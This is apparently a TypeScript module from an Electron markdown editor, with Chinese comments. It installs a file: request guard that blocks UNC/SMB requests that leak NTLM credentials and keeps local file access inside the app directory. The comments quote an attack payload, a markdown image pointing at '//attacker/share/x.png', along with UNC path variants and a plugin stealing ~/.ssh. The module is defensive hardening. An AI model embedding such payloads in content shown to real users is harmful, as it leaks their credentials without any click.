// 安全:拒绝带主机名的 file: 请求,防 Windows UNC/SMB 外连泄露 NTLM 凭据(零点击)。
//
// 打包版 renderer 以 loadFile 加载,页面在 file:// 下。攻击:不受信 markdown 写
// `![](//attacker/share/x.png)`(Milkdown commonmark image 节点仍渲染 <img src>),相对页面 URL
// 解析为 file://attacker/share/x.png → Windows 发起 SMB(或 @SSL 走 WebDAV/HTTPS)并自动 NTLM
// 认证;CSS url() / <link> / fetch 等任意子资源同理。index.html CSP 的 'self' 在 file: 页面下
// 放行任意 file: URL(含其它 host,已实测),拦不住。
//
// 策略:defaultSession 上所有 file: 请求,hostname 非空(含 localhost —— Chromium 不会把它规范化
// 为空,应用自身也从不使用)一律 cancel。应用入口与本地资源都是 file:///…(空 host)不受影响;
// 插件模块走 Blob URL,不经 file:。dev(http 入口)下注册亦无害。
//
// 纵深(路径变体):空 host 但路径以两个分隔符开头(`file:////h/s`、`file:///\\h`)或路径含编码分隔符
// (`%5C` / `%2F`,不分大小写)也拒 —— 任何一层把它还原成 `\\h\s` 即 UNC 外连。Chromium 现状下这些多半
// 已被挡住(Windows 上 url_parse_file.cc 把非恰好三斜杠的 file URL 按 UNC 解析出 host;
// net/base/filename_util.cc FileURLToFilePath 对 %2F/%5C 的 ContainsEncodedBytes 直接失败),本守卫不依赖之。
// 只查路径段:窗口 query(workspace=%2F…)与 hash 不参与。
//
// 应用自身从 UNC 路径运行(入口 file://server/…)时,与入口同 host 的请求放行,否则自拦白屏。
//
// 第二条规则(应用目录围栏):空 host 的 file: 请求也只允许落在应用自身 renderer 产物目录树内(入口
// index.html 所在目录;打包版即 `…/app.asar/out-pack/renderer/`)。file:// 页面下 CSP 的 'self' 匹配
// **全盘** file: URL,且 Electron 把 file: 之间视为同源(实测:fetch 直接读到内容、<iframe> 的
// contentDocument 可读、画布不被污染),所以页面内任何脚本(插件、被注入的内容)原本都能:
//   - fetch / XHR 读任意本地文件(只有 network 权限的插件即可读 ~/.ssh 再 https 外传);
//   - <script src> / import() / <link rel=stylesheet> / @import / <iframe> / FontFace / <audio> 加载工作区
//     里不受信的文件(不受信 .js 变成页面脚本、CSS 选择器外泄、展示本地 HTML)。
// 目录之外一律 cancel。唯一例外是 `image`:Markdown 预览里用户显式写的 `![](file:///abs/x.png)` 需要它
// (Milkdown image 节点 → <img src>)。注意图片像素可被脚本经画布读回(实测未污染),这是保留该功能的
// 已知残余。应用自身不通过 file: 加载目录外的任何东西(插件模块走 Blob URL)。
//
// 覆盖面(Electron 45.3.3 实测 resourceType):fetch 与 XHR = xhr,<script> / import() = script,
// <link> / @import = stylesheet,<iframe> = subFrame,FontFace = font,<audio>/<video> = media。
// **不覆盖 Worker**:Worker / SharedWorker 的脚本加载,以及 Worker 内部的 fetch / XHR / importScripts /
// import(),对 file: 完全不经过 webRequest(protocol.handle('file') 同样拦不到),本守卫对其无效。
//
// 注意:同一 session 每种 webRequest 事件只能有一个 listener,后注册会覆盖前者 —— 新增
// onBeforeRequest 需求须合并进这里(file-request-policy.test.ts 钉住主进程别处不得注册)。
import type { Session } from 'electron';
import path from 'node:path';
import { pathToFileURL } from 'node:url';

/**
 * 纯判定:file: URL 的 authority(`file://` 与下一个 `/` 之间)非空且不等于 allowedHost(入口 host,
 * 本地入口为空串)→ true(拒);路径段以双分隔符开头或含 %5C/%2F → 拒;非 file 不处理。
 * 不用 WHATWG `new URL().hostname`:它把 localhost 规范化为空、对畸形 host 抛错,而 Chromium 交给
 * 加载器的 URL 仍保留原 host(Windows 上非空 host 即映射为 \\host\…)。直接看原始 authority 更贴近
 * 实际加载行为,也天然覆盖 `user@host` / `host@SSL` / `[畸形` 等形态。
 */
export function isBlockedFileRequest(url: string, allowedHost = ''): boolean {
  if (!/^file:/i.test(url)) return false;
  const m = /^file:[/\\]{2}([^/\\?#]*)([^?#]*)/i.exec(url);
  if (m === null) return true;
  const host = m[1]!;
  const pathPart = m[2]!;
  if (host !== '' && host.toLowerCase() !== allowedHost.toLowerCase()) return true;
  return /^[/\\]{2}/.test(pathPart) || /%(?:5c|2f)/i.test(pathPart);
}

/**
 * 纯判定:file: URL 的路径是否落在 rootPathname(应用 renderer 目录的 URL pathname,可带百分号编码)目录树
 * **之外**。先由 WHATWG 解析规范化(折叠 `..` / `%2e%2e`、反斜杠转斜杠),再百分号解码后按前缀比较;
 * 解码后仍出现 `.` / `..` 段或反斜杠、畸形编码、无法解析、根为空 → 一律视为目录外(fail-closed)。
 * 默认区分大小写(大小写不敏感文件系统上换大小写访问同一文件只会被多拒,不会多放);Windows 盘符 /
 * 路径大小写不稳定,由调用方传 caseInsensitive。query / hash 不参与。
 */
export function isFileRequestOutsideRoot(url: string, rootPathname: string, caseInsensitive = false): boolean {
  let reqPath: string;
  let root: string;
  try {
    reqPath = decodeURIComponent(new URL(url).pathname);
    root = decodeURIComponent(rootPathname);
  } catch {
    return true;
  }
  if (root === '' || root === '/') return true;
  // 只由点和空格组成的段都当穿越:Win32 会去掉段尾的点与空格,`.. ` / `...` 在磁盘上等价于 `..` / `.`。
  if (reqPath.includes('\\') || reqPath.split('/').some((seg) => /^[. ]+$/.test(seg))) return true;
  if (!root.endsWith('/')) root += '/';
  if (caseInsensitive) {
    reqPath = reqPath.toLowerCase();
    root = root.toLowerCase();
  }
  return !reqPath.startsWith(root);
}

/** 目录围栏的唯一例外资源类型:Markdown 预览的本地绝对路径图片。 */
const OUTSIDE_ROOT_ALLOWED_RESOURCE_TYPE = 'image';

type WebRequestSession = { webRequest: Pick<Session['webRequest'], 'onBeforeRequest'> };

/**
 * app ready 后、首窗创建前对 session(defaultSession)注册;entryFile 为 renderer 入口 index.html 绝对路径,
 * 其所在目录即应用目录围栏的根。
 */
export function installFileRequestGuard(ses: WebRequestSession, entryFile: string): void {
  let entryHost = '';
  try {
    entryHost = pathToFileURL(entryFile).host;
  } catch {
    entryHost = '';
  }
  let rootPathname = '';
  try {
    rootPathname = pathToFileURL(path.dirname(entryFile)).pathname;
  } catch {
    rootPathname = ''; // 根未知 → 围栏拒绝一切(fail-closed)
  }
  const caseInsensitive = process.platform === 'win32';
  ses.webRequest.onBeforeRequest({ urls: ['file://*/*'] }, (details, callback) => {
    let cancel = true;
    try {
      const url = details.url;
      cancel =
        isBlockedFileRequest(url, entryHost) ||
        (details.resourceType !== OUTSIDE_ROOT_ALLOWED_RESOURCE_TYPE &&
          isFileRequestOutsideRoot(url, rootPathname, caseInsensitive));
    } catch {
      cancel = true;
    }
    callback({ cancel });
  });
}
